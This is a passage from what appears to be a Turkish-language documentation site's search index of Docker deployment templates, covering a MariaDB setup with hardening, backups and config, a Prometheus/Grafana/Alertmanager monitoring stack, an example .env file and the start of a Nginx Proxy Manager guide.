Ayn\u0131) ...\n\nCOPY . .\n\n# Publish \u00f6ncesi Frontend Build (\u00d6rnek)\nWORKDIR \"/src/src/MyProject.Web\"\nRUN npm install\nRUN npm run build # CSS/JS dosyalar\u0131n\u0131 wwwroot alt\u0131na atar\n\n# Sonra .NET Publish (wwwroot dahil edilir)\nRUN dotnet publish \"MyProject.Web.csproj\" -c Release -o /app/publish\n</code></pre> <p>[!TIP] E\u011fer Frontend build i\u015flemini (npm run build) local'de yap\u0131p <code>wwwroot</code> klas\u00f6r\u00fcn\u00fc commit at\u0131yorsan\u0131z, yukar\u0131daki Node.js ad\u0131m\u0131na gerek yoktur. Standart .NET Dockerfile yeterlidir.</p>"},{"location":"file-templates/env-example/","title":"Environment Variables Example (.env)","text":"<pre><code># --- Application ---\nAPP_ENV=production\nAPP_PORT=3000\nAPP_SECRET=change_this_to_a_long_random_string\n\n# --- Database ---\nDB_HOST=db\nDB_PORT=5432\nDB_NAME=myapp\nDB_USER=postgres\nDB_PASS=secure_password_123\n\n# --- Redis ---\nREDIS_HOST=redis\nREDIS_PORT=6379\nREDIS_PASS=secure_redis_password\n\n# --- External APIs ---\nAWS_ACCESS_KEY=AKIA...\nAWS_SECRET_KEY=wJal...\n</code></pre>"},{"location":"file-templates/mariadb/","title":"MariaDB (Production Ready) \ud83d\udc2c","text":"<p>MariaDB, MySQL'in a\u00e7\u0131k kaynak fork'u olup, Oracle kontrol\u00fcnden ba\u011f\u0131ms\u0131z, topluluk odakl\u0131 bir veritaban\u0131d\u0131r. Performans ve g\u00fcvenlik a\u00e7\u0131s\u0131ndan optimize edilmi\u015ftir.</p>"},{"location":"file-templates/mariadb/#mariadb-vs-mysql-vs-postgresql","title":"\u2696\ufe0f MariaDB vs MySQL vs PostgreSQL","text":"\u00d6zellik MariaDB MySQL PostgreSQL Lisans GPL (\u00d6zg\u00fcr) GPL (Oracle kontrol\u00fc) PostgreSQL License Performans H\u0131zl\u0131 (\u00f6zellikle k\u00fc\u00e7\u00fck i\u015flemler) H\u0131zl\u0131 \u00c7ok g\u00fc\u00e7l\u00fc (karma\u015f\u0131k sorgular) Storage Engine Aria, InnoDB, ColumnStore InnoDB Native (MVCC) Kullan\u0131m Web uygulamalar\u0131, WordPress Genel ama\u00e7l\u0131 Analitik, b\u00fcy\u00fck veri"},{"location":"file-templates/mariadb/#klasor-yaps","title":"\ud83c\udfd7\ufe0f Klas\u00f6r Yap\u0131s\u0131","text":"<pre><code>mariadb/\n\u251c\u2500\u2500 docker-compose.yml\n\u251c\u2500\u2500 .env\n\u251c\u2500\u2500 secrets/\n\u2502   \u2514\u2500\u2500 db_root_password.txt\n\u251c\u2500\u2500 configs/\n\u2502   \u2514\u2500\u2500 my.cnf\n\u251c\u2500\u2500 data/                    # Veritaban\u0131 dosyalar\u0131\n\u2514\u2500\u2500 init-scripts/            # \u0130lk \u00e7al\u0131\u015ft\u0131rmada \u00e7al\u0131\u015facak SQL'ler\n    \u2514\u2500\u2500 01-create-users.sql\n</code></pre>"},{"location":"file-templates/mariadb/#docker-compose-dosyas","title":"\ud83d\udc33 Docker Compose Dosyas\u0131","text":"<p><code>docker-compose.yml</code>:</p> <pre><code>version: \"3.8\"\n\nservices:\n  mariadb:\n    image: mariadb:11.2-jammy # LTS s\u00fcr\u00fcm\u00fc\n    container_name: production_mariadb\n    restart: always\n\n    # G\u00fcvenlik - Docker Secrets kullan\u0131m\u0131\n    secrets:\n      - db_root_password\n\n    environment:\n      MARIADB_ROOT_PASSWORD_FILE: /run/secrets/db_root_password\n      MARIADB_DATABASE: app_db\n      MARIADB_USER: app_user\n      MARIADB_PASSWORD: AppUserPassword123!\n      TZ: Europe/Istanbul\n\n    ports:\n      # Sadece localhost'a a\u00e7 (d\u0131\u015far\u0131ya kapal\u0131)\n      - \"127.0.0.1:13306:3306\"\n\n    volumes:\n      - ./data:/var/lib/mysql\n      - ./configs/my.cnf:/etc/mysql/conf.d/custom.cnf:ro\n      - ./init-scripts:/docker-entrypoint-initdb.d:ro\n\n    # --- G\u00dcVENL\u0130K (HARDENING) ---\n    cap_drop:\n      - ALL\n    cap_add:\n      - CHOWN\n      - SETGID\n      - SETUID\n      - DAC_OVERRIDE # Dosya izinleri i\u00e7in gerekli\n\n    security_opt:\n      - no-new-privileges:true\n\n    # --- KAYNAK L\u0130M\u0130TLER\u0130 ---\n    mem_limit: 2g\n    mem_reservation: 512m\n    cpus: 2.0\n\n    # --- SA\u011eLIK KONTROL\u00dc ---\n    healthcheck:\n      test: [\"CMD\", \"healthcheck.sh\", \"--connect\", \"--innodb_initialized\"]\n      interval: 10s\n      timeout: 5s\n      retries: 3\n      start_period: 30s\n\n    networks:\n      - backend_net\n\nsecrets:\n  db_root_password:\n    file: ./secrets/db_root_password.txt\n\nnetworks:\n  backend_net:\n    driver: bridge\n</code></pre>"},{"location":"file-templates/mariadb/#secrets-olusturma","title":"\ud83d\udd10 Secrets Olu\u015fturma","text":"<pre><code># Secrets klas\u00f6r\u00fc\nmkdir -p secrets\n\n# Root \u015fifresi (G\u00dcVENL\u0130 bir \u015fifre belirleyin!)\necho \"SuperSecureRootPassword123!\" &gt; secrets/db_root_password.txt\nchmod 600 secrets/db_root_password.txt\n</code></pre>"},{"location":"file-templates/mariadb/#performans-ayarlar-mycnf","title":"\u2699\ufe0f Performans Ayarlar\u0131 (<code>my.cnf</code>)","text":"<p><code>configs/my.cnf</code>:</p> <pre><code>[mysqld]\n# --- BA\u011eLANTI AYARLARI ---\nmax_connections = 200\nconnect_timeout = 10\nwait_timeout = 600\nmax_allowed_packet = 64M\n\n# --- BELLEK Y\u00d6NET\u0130M\u0130 ---\n# Toplam RAM'in %50-70'i\ninnodb_buffer_pool_size = 1G\ninnodb_log_file_size = 256M\ninnodb_log_buffer_size = 16M\n\n# Query cache (MariaDB 10.5+ i\u00e7in kald\u0131r\u0131ld\u0131, eski s\u00fcr\u00fcmlerde kullan\u0131l\u0131r)\n# query_cache_size = 0\n# query_cache_type = 0\n\n# --- PERFORMANS ---\ninnodb_flush_log_at_trx_commit = 2  # 1=G\u00fcvenli ama yava\u015f, 2=H\u0131zl\u0131\ninnodb_flush_method = O_DIRECT\ninnodb_file_per_table = 1\n\n# --- KARAKTER SET\u0130 ---\ncharacter-set-server = utf8mb4\ncollation-server = utf8mb4_unicode_ci\n\n# --- LOGLAMA ---\nlog_error = /var/log/mysql/error.log\nslow_query_log = 1\nslow_query_log_file = /var/log/mysql/slow.log\nlong_query_time = 2\n\n# --- G\u00dcVENL\u0130K ---\n# Uzaktan root giri\u015fini engelle\nbind-address = 0.0.0.0  # Docker network i\u00e7inde eri\u015fim i\u00e7in\nskip-name-resolve = 1   # DNS lookup'\u0131 atla (performans)\n\n# --- ARIA STORAGE ENGINE (MariaDB'ye \u00f6zg\u00fc) ---\naria_pagecache_buffer_size = 128M\n</code></pre>"},{"location":"file-templates/mariadb/#ilk-kurulum-scripti","title":"\ud83d\udcdd \u0130lk Kurulum Script'i","text":"<p><code>init-scripts/01-create-users.sql</code>:</p> <pre><code>-- Ek kullan\u0131c\u0131lar olu\u015ftur\nCREATE USER IF NOT EXISTS 'readonly_user'@'%' IDENTIFIED BY 'ReadOnlyPass123!';\nGRANT SELECT ON app_db.* TO 'readonly_user'@'%';\n\n-- Yedekleme kullan\u0131c\u0131s\u0131\nCREATE USER IF NOT EXISTS 'backup_user'@'localhost' IDENTIFIED BY 'BackupPass123!';\nGRANT SELECT, LOCK TABLES, SHOW VIEW, EVENT, TRIGGER ON *.* TO 'backup_user'@'localhost';\n\nFLUSH PRIVILEGES;\n</code></pre>"},{"location":"file-templates/mariadb/#baslatma","title":"\ud83d\ude80 Ba\u015flatma","text":"<pre><code>docker compose up -d\n</code></pre>"},{"location":"file-templates/mariadb/#baglant-testi","title":"Ba\u011flant\u0131 Testi","text":"<pre><code># Container i\u00e7inden\ndocker exec -it production_mariadb mariadb -u root -p\n\n# Host'tan (port 13306)\nmariadb -h 127.0.0.1 -P 13306 -u app_user -p\n</code></pre>"},{"location":"file-templates/mariadb/#yedekleme","title":"\ud83d\udcbe Yedekleme","text":""},{"location":"file-templates/mariadb/#manuel-yedekleme","title":"Manuel Yedekleme","text":"<pre><code># T\u00fcm veritabanlar\u0131n\u0131 yedekle\ndocker exec production_mariadb mariadb-dump \\\n  -u root -p$(cat secrets/db_root_password.txt) \\\n  --all-databases \\\n  --single-transaction \\\n  --quick \\\n  --lock-tables=false \\\n  &gt; backup_$(date +%Y%m%d_%H%M%S).sql\n\n# Sadece app_db'yi yedekle\ndocker exec production_mariadb mariadb-dump \\\n  -u root -p$(cat secrets/db_root_password.txt) \\\n  --databases app_db \\\n  --single-transaction \\\n  &gt; app_db_backup.sql\n</code></pre>"},{"location":"file-templates/mariadb/#otomatik-yedekleme-cron","title":"Otomatik Yedekleme (Cron)","text":"<p><code>backup.sh</code> scripti olu\u015fturun:</p> <pre><code>#!/bin/bash\nBACKUP_DIR=\"/opt/backups/mariadb\"\nDATE=$(date +%Y%m%d_%H%M%S)\nPASSWORD=$(cat /opt/mariadb/secrets/db_root_password.txt)\n\nmkdir -p $BACKUP_DIR\n\ndocker exec production_mariadb mariadb-dump \\\n  -u root -p$PASSWORD \\\n  --all-databases \\\n  --single-transaction \\\n  --quick \\\n  | gzip &gt; $BACKUP_DIR/backup_$DATE.sql.gz\n\n# 7 g\u00fcnden eski yedekleri sil\nfind $BACKUP_DIR -name \"backup_*.sql.gz\" -mtime +7 -delete\n</code></pre> <p>Cron'a ekleyin:</p> <pre><code>chmod +x backup.sh\ncrontab -e\n# Her gece 02:00'de yedek al\n0 2 * * * /opt/mariadb/backup.sh\n</code></pre>"},{"location":"file-templates/mariadb/#bakm-komutlar","title":"\ud83d\udd27 Bak\u0131m Komutlar\u0131","text":""},{"location":"file-templates/mariadb/#veritaban-boyutu","title":"Veritaban\u0131 Boyutu","text":"<pre><code>SELECT\n    table_schema AS 'Database',\n    ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)'\nFROM information_schema.tables\nGROUP BY table_schema;\n</code></pre>"},{"location":"file-templates/mariadb/#tablo-optimizasyonu","title":"Tablo Optimizasyonu","text":"<pre><code>-- T\u00fcm tablolar\u0131 optimize et\nOPTIMIZE TABLE table_name;\n\n-- T\u00fcm veritaban\u0131n\u0131 analiz et\nANALYZE TABLE table_name;\n</code></pre>"},{"location":"file-templates/mariadb/#yavas-sorgular-goruntuleme","title":"Yava\u015f Sorgular\u0131 G\u00f6r\u00fcnt\u00fcleme","text":"<pre><code>docker exec production_mariadb tail -f /var/log/mysql/slow.log\n</code></pre>"},{"location":"file-templates/mariadb/#guvenlik-ipuclar","title":"\ud83d\udd12 G\u00fcvenlik \u0130pu\u00e7lar\u0131","text":"<p>[!WARNING] &gt; \u00dcretim Ortam\u0131 \u0130\u00e7in:</p> <ol> <li><code>MARIADB_ROOT_PASSWORD</code> asla <code>.env</code> dosyas\u0131na yazmay\u0131n, Docker Secrets kullan\u0131n</li> <li>Port <code>13306</code>'y\u0131 sadece localhost'a a\u00e7\u0131n (compose dosyas\u0131nda <code>127.0.0.1:13306:3306</code>)</li> <li>Firewall'da 3306 portunu kapat\u0131n (zaten localhost'a a\u00e7\u0131k)</li> <li>D\u00fczenli yedek al\u0131n ve yedekleri farkl\u0131 bir sunucuda saklay\u0131n</li> </ol> <p>[!TIP] &gt; Performans \u0130yile\u015ftirme:</p> <ul> <li><code>innodb_buffer_pool_size</code> \u2192 RAM'in %50-70'i</li> <li><code>innodb_flush_log_at_trx_commit = 2</code> \u2192 H\u0131z i\u00e7in (veri kayb\u0131 riski az)</li> <li><code>skip-name-resolve = 1</code> \u2192 DNS lookup'\u0131 atla</li> </ul>"},{"location":"file-templates/mariadb/#sorun-giderme","title":"\ud83d\udc1b Sorun Giderme","text":"<p>Container ba\u015flam\u0131yor:</p> <pre><code>docker logs production_mariadb --tail 50\n</code></pre> <p>Ba\u011flant\u0131 hatas\u0131:</p> <pre><code># Port dinliyor mu?\ndocker exec production_mariadb ss -tlnp | grep 3306\n\n# Kullan\u0131c\u0131 var m\u0131?\ndocker exec -it production_mariadb mariadb -u root -p -e \"SELECT User, Host FROM mysql.user;\"\n</code></pre> <p>Yava\u015f sorgular:</p> <pre><code>SHOW FULL PROCESSLIST;\nSHOW ENGINE INNODB STATUS\\G\n</code></pre>"},{"location":"file-templates/monitoring-stack/","title":"Monitoring Stack (Production Ready) \ud83d\udcca","text":"<p>Modern production ortamlar\u0131nda Prometheus + Grafana + Exporters kombinasyonu end\u00fcstri standard\u0131d\u0131r. Bu template ile tam bir monitoring altyap\u0131s\u0131 kurabilirsiniz.</p>"},{"location":"file-templates/monitoring-stack/#klasor-yaps","title":"\ud83c\udfd7\ufe0f Klas\u00f6r Yap\u0131s\u0131","text":"<pre><code>monitoring/\n\u251c\u2500\u2500 docker-compose.yml\n\u251c\u2500\u2500 prometheus/\n\u2502   \u251c\u2500\u2500 prometheus.yml\n\u2502   \u251c\u2500\u2500 alerts.yml\n\u2502   \u2514\u2500\u2500 data/\n\u251c\u2500\u2500 grafana/\n\u2502   \u251c\u2500\u2500 provisioning/\n\u2502   \u2502   \u251c\u2500\u2500 datasources/\n\u2502   \u2502   \u2502   \u2514\u2500\u2500 prometheus.yml\n\u2502   \u2502   \u2514\u2500\u2500 dashboards/\n\u2502   \u2502       \u251c\u2500\u2500 dashboard.yml\n\u2502   \u2502       \u2514\u2500\u2500 node-exporter.json\n\u2502   \u2514\u2500\u2500 data/\n\u251c\u2500\u2500 alertmanager/\n\u2502   \u251c\u2500\u2500 config.yml\n\u2502   \u2514\u2500\u2500 data/\n\u2514\u2500\u2500 loki/\n    \u251c\u2500\u2500 config.yml\n    \u2514\u2500\u2500 data/\n</code></pre>"},{"location":"file-templates/monitoring-stack/#docker-compose-dosyas","title":"\ud83d\udc33 Docker Compose Dosyas\u0131","text":"<pre><code>version: \"3.8\"\n\nservices:\n  # Prometheus - Metrics toplama\n  prometheus:\n    image: prom/prometheus:latest\n    container_name: prometheus\n    restart: always\n    command:\n      - \"--config.file=/etc/prometheus/prometheus.yml\"\n      - \"--storage.tsdb.path=/prometheus\"\n      - \"--storage.tsdb.retention.time=30d\"\n      - \"--web.console.libraries=/etc/prometheus/console_libraries\"\n      - \"--web.console.templates=/etc/prometheus/consoles\"\n      - \"--web.enable-lifecycle\"\n    ports:\n      - \"127.0.0.1:9090:9090\"\n    volumes:\n      - ./prometheus/prometheus.yml:/etc/prometheus/prometheus.yml:ro\n      - ./prometheus/alerts.yml:/etc/prometheus/alerts.yml:ro\n      - ./prometheus/data:/prometheus\n    networks:\n      - monitoring\n    mem_limit: 1g\n    cpus: 1.0\n\n  # Grafana - G\u00f6rselle\u015ftirme\n  grafana:\n    image: grafana/grafana:latest\n    container_name: grafana\n    restart: always\n    environment:\n      - GF_SECURITY_ADMIN_USER=admin\n      - GF_SECURITY_ADMIN_PASSWORD=admin123 # \u00d6NEML\u0130: De\u011fi\u015ftirin!\n      - GF_USERS_ALLOW_SIGN_UP=false\n      - GF_SERVER_ROOT_URL=http://monitoring.example.com\n      - GF_INSTALL_PLUGINS=grafana-piechart-panel\n    ports:\n      - \"127.0.0.1:3000:3000\"\n    volumes:\n      - ./grafana/data:/var/lib/grafana\n      - ./grafana/provisioning:/etc/grafana/provisioning:ro\n    networks:\n      - monitoring\n    depends_on:\n      - prometheus\n    mem_limit: 512m\n\n  # Node Exporter - Sistem metrikleri\n  node-exporter:\n    image: prom/node-exporter:latest\n    container_name: node-exporter\n    restart: always\n    command:\n      - \"--path.procfs=/host/proc\"\n      - \"--path.sysfs=/host/sys\"\n      - \"--path.rootfs=/rootfs\"\n      - \"--collector.filesystem.mount-points-exclude=^/(sys|proc|dev|host|etc)($$|/)\"\n    ports:\n      - \"127.0.0.1:9100:9100\"\n    volumes:\n      - /proc:/host/proc:ro\n      - /sys:/host/sys:ro\n      - /:/rootfs:ro\n    networks:\n      - monitoring\n    pid: host\n\n  # cAdvisor - Container metrikleri\n  cadvisor:\n    image: gcr.io/cadvisor/cadvisor:latest\n    container_name: cadvisor\n    restart: always\n    ports:\n      - \"127.0.0.1:8080:8080\"\n    volumes:\n      - /:/rootfs:ro\n      - /var/run:/var/run:ro\n      - /sys:/sys:ro\n      - /var/lib/docker/:/var/lib/docker:ro\n      - /dev/disk/:/dev/disk:ro\n    networks:\n      - monitoring\n    privileged: true\n    devices:\n      - /dev/kmsg\n\n  # Alertmanager - Alarm y\u00f6netimi\n  alertmanager:\n    image: prom/alertmanager:latest\n    container_name: alertmanager\n    restart: always\n    command:\n      - \"--config.file=/etc/alertmanager/config.yml\"\n      - \"--storage.path=/alertmanager\"\n    ports:\n      - \"127.0.0.1:9093:9093\"\n    volumes:\n      - ./alertmanager/config.yml:/etc/alertmanager/config.yml:ro\n      - ./alertmanager/data:/alertmanager\n    networks:\n      - monitoring\n\n  # Loki - Log toplama (opsiyonel)\n  loki:\n    image: grafana/loki:latest\n    container_name: loki\n    restart: always\n    ports:\n      - \"127.0.0.1:3100:3100\"\n    volumes:\n      - ./loki/config.yml:/etc/loki/local-config.yaml:ro\n      - ./loki/data:/loki\n    command: -config.file=/etc/loki/local-config.yaml\n    networks:\n      - monitoring\n\n  # Promtail - Log shipper (opsiyonel)\n  promtail:\n    image: grafana/promtail:latest\n    container_name: promtail\n    restart: always\n    volumes:\n      - /var/log:/var/log:ro\n      - /var/lib/docker/containers:/var/lib/docker/containers:ro\n      - ./loki/promtail-config.yml:/etc/promtail/config.yml:ro\n    command: -config.file=/etc/promtail/config.yml\n    networks:\n      - monitoring\n\nnetworks:\n  monitoring:\n    driver: bridge\n</code></pre>"},{"location":"file-templates/monitoring-stack/#prometheus-konfigurasyonu","title":"\u2699\ufe0f Prometheus Konfig\u00fcrasyonu","text":"<p><code>prometheus/prometheus.yml</code>:</p> <pre><code>global:\n  scrape_interval: 15s\n  evaluation_interval: 15s\n  external_labels:\n    cluster: \"production\"\n    region: \"eu-west-1\"\n\n# Alertmanager ba\u011flant\u0131s\u0131\nalerting:\n  alertmanagers:\n    - static_configs:\n        - targets:\n            - alertmanager:9093\n\n# Alert kurallar\u0131\nrule_files:\n  - \"alerts.yml\"\n\n# Scrape hedefleri\nscrape_configs:\n  # Prometheus kendisi\n  - job_name: \"prometheus\"\n    static_configs:\n      - targets: [\"localhost:9090\"]\n\n  # Node Exporter (Sistem metrikleri)\n  - job_name: \"node-exporter\"\n    static_configs:\n      - targets: [\"node-exporter:9100\"]\n        labels:\n          instance: \"production-server\"\n\n  # cAdvisor (Container metrikleri)\n  - job_name: \"cadvisor\"\n    static_configs:\n      - targets: [\"cadvisor:8080\"]\n\n  # Docker container'lar\u0131 otomatik ke\u015ffet\n  - job_name: \"docker-containers\"\n    docker_sd_configs:\n      - host: unix:///var/run/docker.sock\n    relabel_configs:\n      - source_labels: [__meta_docker_container_name]\n        target_label: container\n\n  # Postgres Exporter (e\u011fer kuruluysa)\n  - job_name: \"postgres\"\n    static_configs:\n      - targets: [\"postgres-exporter:9187\"]\n\n  # Redis Exporter (e\u011fer kuruluysa)\n  - job_name: \"redis\"\n    static_configs:\n      - targets: [\"redis-exporter:9121\"]\n\n  # Nginx Exporter (e\u011fer kuruluysa)\n  - job_name: \"nginx\"\n    static_configs:\n      - targets: [\"nginx-exporter:9113\"]\n\n  # Blackbox Exporter (HTTP/HTTPS health check)\n  - job_name: \"blackbox\"\n    metrics_path: /probe\n    params:\n      module: [http_2xx]\n    static_configs:\n      - targets:\n          - https://example.com\n          - https://api.example.com\n    relabel_configs:\n      - source_labels: [__address__]\n        target_label: __param_target\n      - source_labels: [__param_target]\n        target_label: instance\n      - target_label: __address__\n        replacement: blackbox-exporter:9115\n</code></pre>"},{"location":"file-templates/monitoring-stack/#alert-kurallar","title":"\ud83d\udea8 Alert Kurallar\u0131","text":"<p><code>prometheus/alerts.yml</code>:</p> <pre><code>groups:\n  - name: system_alerts\n    interval: 30s\n    rules:\n      # Y\u00fcksek CPU kullan\u0131m\u0131\n      - alert: HighCPUUsage\n        expr: 100 - (avg by(instance) (rate(node_cpu_seconds_total{mode=\"idle\"}[5m])) * 100) &gt; 80\n        for: 5m\n        labels:\n          severity: warning\n        annotations:\n          summary: \"High CPU usage on {{ $labels.instance }}\"\n          description: \"CPU usage is above 80% (current: {{ $value }}%)\"\n\n      # Y\u00fcksek Memory kullan\u0131m\u0131\n      - alert: HighMemoryUsage\n        expr: (1 - (node_memory_MemAvailable_bytes / node_memory_MemTotal_bytes)) * 100 &gt; 85\n        for: 5m\n        labels:\n          severity: warning\n        annotations:\n          summary: \"High memory usage on {{ $labels.instance }}\"\n          description: \"Memory usage is above 85% (current: {{ $value }}%)\"\n\n      # Disk doluluk\n      - alert: DiskSpaceLow\n        expr: (node_filesystem_avail_bytes{mountpoint=\"/\"} / node_filesystem_size_bytes{mountpoint=\"/\"}) * 100 &lt; 15\n        for: 5m\n        labels:\n          severity: critical\n        annotations:\n          summary: \"Low disk space on {{ $labels.instance }}\"\n          description: \"Disk space is below 15% (current: {{ $value }}%)\"\n\n      # Servis down\n      - alert: ServiceDown\n        expr: up == 0\n        for: 2m\n        labels:\n          severity: critical\n        annotations:\n          summary: \"Service {{ $labels.job }} is down\"\n          description: \"{{ $labels.instance }} has been down for more than 2 minutes\"\n\n      # Container restart\n      - alert: ContainerRestarting\n        expr: rate(container_last_seen{name!=\"\"}[5m]) &gt; 0\n        for: 5m\n        labels:\n          severity: warning\n        annotations:\n          summary: \"Container {{ $labels.name }} is restarting\"\n          description: \"Container has restarted {{ $value }} times in the last 5 minutes\"\n\n  - name: application_alerts\n    interval: 30s\n    rules:\n      # HTTP 5xx hatalar\n      - alert: HighErrorRate\n        expr: rate(http_requests_total{status=~\"5..\"}[5m]) &gt; 0.05\n        for: 5m\n        labels:\n          severity: critical\n        annotations:\n          summary: \"High error rate on {{ $labels.instance }}\"\n          description: \"Error rate is {{ $value }} req/s\"\n\n      # Yava\u015f response time\n      - alert: SlowResponseTime\n        expr: histogram_quantile(0.95, rate(http_request_duration_seconds_bucket[5m])) &gt; 1\n        for: 5m\n        labels:\n          severity: warning\n        annotations:\n          summary: \"Slow response time on {{ $labels.instance }}\"\n          description: \"95th percentile is {{ $value }}s\"\n</code></pre>"},{"location":"file-templates/monitoring-stack/#alertmanager-konfigurasyonu","title":"\ud83d\udce7 Alertmanager Konfig\u00fcrasyonu","text":"<p><code>alertmanager/config.yml</code>:</p> <pre><code>global:\n  resolve_timeout: 5m\n  smtp_smarthost: \"smtp.gmail.com:587\"\n  smtp_from: \"alerts@example.com\"\n  smtp_auth_username: \"alerts@example.com\"\n  smtp_auth_password: \"your-app-password\"\n\n# Alarm y\u00f6nlendirme\nroute:\n  group_by: [\"alertname\", \"cluster\", \"service\"]\n  group_wait: 10s\n  group_interval: 10s\n  repeat_interval: 12h\n  receiver: \"default\"\n  routes:\n    # Critical alarmlar hemen g\u00f6nder\n    - match:\n        severity: critical\n      receiver: \"critical-alerts\"\n      continue: true\n\n    # Warning alarmlar 5 dakika bekle\n    - match:\n        severity: warning\n      receiver: \"warning-alerts\"\n      group_wait: 5m\n\n# Al\u0131c\u0131lar\nreceivers:\n  - name: \"default\"\n    email_configs:\n      - to: \"team@example.com\"\n        headers:\n          Subject: \"[MONITORING] {{ .GroupLabels.alertname }}\"\n\n  - name: \"critical-alerts\"\n    email_configs:\n      - to: \"oncall@example.com\"\n        headers:\n          Subject: \"\ud83d\udea8 [CRITICAL] {{ .GroupLabels.alertname }}\"\n    # Slack entegrasyonu\n    slack_configs:\n      - api_url: \"https://hooks.slack.com/services/YOUR/WEBHOOK/URL\"\n        channel: \"#alerts\"\n        title: \"\ud83d\udea8 Critical Alert\"\n        text: \"{{ range .Alerts }}{{ .Annotations.description }}{{ end }}\"\n\n  - name: \"warning-alerts\"\n    email_configs:\n      - to: \"team@example.com\"\n        headers:\n          Subject: \"\u26a0\ufe0f [WARNING] {{ .GroupLabels.alertname }}\"\n\n# Alarm susturma\ninhibit_rules:\n  - source_match:\n      severity: \"critical\"\n    target_match:\n      severity: \"warning\"\n    equal: [\"alertname\", \"instance\"]\n</code></pre>"},{"location":"file-templates/monitoring-stack/#grafana-datasource-provisioning","title":"\ud83d\udcca Grafana Datasource Provisioning","text":"<p><code>grafana/provisioning/datasources/prometheus.yml</code>:</p> <pre><code>apiVersion: 1\n\ndatasources:\n  - name: Prometheus\n    type: prometheus\n    access: proxy\n    url: http://prometheus:9090\n    isDefault: true\n    editable: false\n\n  - name: Loki\n    type: loki\n    access: proxy\n    url: http://loki:3100\n    editable: false\n</code></pre>"},{"location":"file-templates/monitoring-stack/#baslatma","title":"\ud83d\ude80 Ba\u015flatma","text":"<pre><code># Klas\u00f6rleri olu\u015ftur\nmkdir -p prometheus/data grafana/data alertmanager/data loki/data\n\n# \u0130zinleri ayarla\nsudo chown -R 65534:65534 prometheus/data\nsudo chown -R 472:472 grafana/data\n\n# Stack'i ba\u015flat\ndocker compose up -d\n\n# Loglar\u0131 kontrol et\ndocker compose logs -f\n</code></pre>"},{"location":"file-templates/monitoring-stack/#erisim-urlleri","title":"\ud83d\udd17 Eri\u015fim URL'leri","text":"Servis URL Varsay\u0131lan Giri\u015f Grafana http://localhost:3000 admin / admin123 Prometheus http://localhost:9090 - Alertmanager http://localhost:9093 - Node Exporter http://localhost:9100/metrics - cAdvisor http://localhost:8080 -"},{"location":"file-templates/monitoring-stack/#onerilen-grafana-dashboardlar","title":"\ud83d\udcc8 \u00d6nerilen Grafana Dashboard'lar\u0131","text":"<pre><code># Grafana'ya giri\u015f yapt\u0131ktan sonra:\n# 1. Dashboards \u2192 Import\n# 2. A\u015fa\u011f\u0131daki ID'leri kullan:\n\n# Node Exporter Full\n1860\n\n# Docker Container &amp; Host Metrics\n10619\n\n# Prometheus 2.0 Stats\n3662\n\n# Loki Dashboard\n13639\n</code></pre>"},{"location":"file-templates/monitoring-stack/#ek-exporterlar","title":"\ud83d\udd27 Ek Exporter'lar","text":""},{"location":"file-templates/monitoring-stack/#postgres-exporter","title":"Postgres Exporter","text":"<pre><code>postgres-exporter:\n  image: prometheuscommunity/postgres-exporter\n  container_name: postgres-exporter\n  restart: always\n  environment:\n    DATA_SOURCE_NAME: \"postgresql://user:password@postgres:5432/dbname?sslmode=disable\"\n  ports:\n    - \"127.0.0.1:9187:9187\"\n  networks:\n    - monitoring\n</code></pre>"},{"location":"file-templates/monitoring-stack/#redis-exporter","title":"Redis Exporter","text":"<pre><code>redis-exporter:\n  image: oliver006/redis_exporter\n  container_name: redis-exporter\n  restart: always\n  environment:\n    REDIS_ADDR: \"redis:6379\"\n    REDIS_PASSWORD: \"your-redis-password\"\n  ports:\n    - \"127.0.0.1:9121:9121\"\n  networks:\n    - monitoring\n</code></pre>"},{"location":"file-templates/monitoring-stack/#nginx-exporter","title":"Nginx Exporter","text":"<pre><code>nginx-exporter:\n  image: nginx/nginx-prometheus-exporter\n  container_name: nginx-exporter\n  restart: always\n  command:\n    - \"-nginx.scrape-uri=http://nginx:8080/stub_status\"\n  ports:\n    - \"127.0.0.1:9113:9113\"\n  networks:\n    - monitoring\n</code></pre>"},{"location":"file-templates/monitoring-stack/#guvenlik-onerileri","title":"\ud83d\udee1\ufe0f G\u00fcvenlik \u00d6nerileri","text":"<p>[!WARNING] &gt; Production Ortam\u0131 \u0130\u00e7in:</p> <ol> <li>Grafana \u015fifresini de\u011fi\u015ftirin (<code>GF_SECURITY_ADMIN_PASSWORD</code>)</li> <li>Port'lar\u0131 localhost'a ba\u011flay\u0131n (zaten yap\u0131lm\u0131\u015f)</li> <li>Nginx Reverse Proxy kullan\u0131n (SSL ile)</li> <li>Alertmanager SMTP \u015fifresini <code>.env</code> dosyas\u0131na ta\u015f\u0131y\u0131n</li> <li>Retention s\u00fcresini ihtiyac\u0131n\u0131za g\u00f6re ayarlay\u0131n (varsay\u0131lan 30 g\u00fcn)</li> </ol>"},{"location":"file-templates/monitoring-stack/#referanslar","title":"\ud83d\udcda Referanslar","text":"<ul> <li>Prometheus Documentation</li> <li>Grafana Documentation</li> <li>Node Exporter</li> <li>Alertmanager</li> </ul>"},{"location":"file-templates/nginx-proxy-manager/","title":"Nginx Proxy Manager (Production Ready) \ud83c\udf10","text":"<p>Nginx Proxy Manager (NPM), SSL sertifikalar\u0131n\u0131 otomatik y\u00f6neten (Let's Encrypt) ve web aray\u00fcz\u00fc (UI) \u00fczerinden host eklemenizi sa\u011flayan pop\u00fcler bir ara\u00e7t\u0131r.</p>"},{"location":"file-templates/nginx-proxy-manager/#hangi-kurulum-yontemini-secmeliyim","title":"\u2696\ufe0f Hangi Kurulum Y\u00f6ntemini Se\u00e7meliyim?","text":"Se\u00e7enek Ne Zaman Kullan\u0131l\u0131r Avantaj Dezavantaj \ud83d\udd17 Mevcut Postgres/MariaDB Sunucuda zaten DB varsa Kaynak tasarrufu, tek DB y\u00f6netimi Network ayar\u0131 gerekir \ud83d\udc2c Yeni MariaDB S\u0131f\u0131rdan kurulum, 2GB+ RAM H\u0131zl\u0131, g\u00fcvenilir Ekstra container \ud83d\udc18 Yeni PostgreSQL Postgres ekosistemi tercih ediliyorsa Modern, g\u00fc\u00e7l\u00fc Ekstra container \ud83c\udf43 SQLite K\u00fc\u00e7\u00fck VPS (&lt;512MB RAM) \u00c7ok hafif, kolay D\u00fc\u015f\u00fck performans <p>[!TIP] &gt; \u00d6nerimiz: E\u011fer sunucunuzda zaten \u00e7al\u0131\u015fan bir Postgres veya MariaDB varsa, \"Mevcut DB'ye Ba\u011flanma\" b\u00f6l\u00fcm\u00fcne ge\u00e7in. Yeni container kurmaya gerek 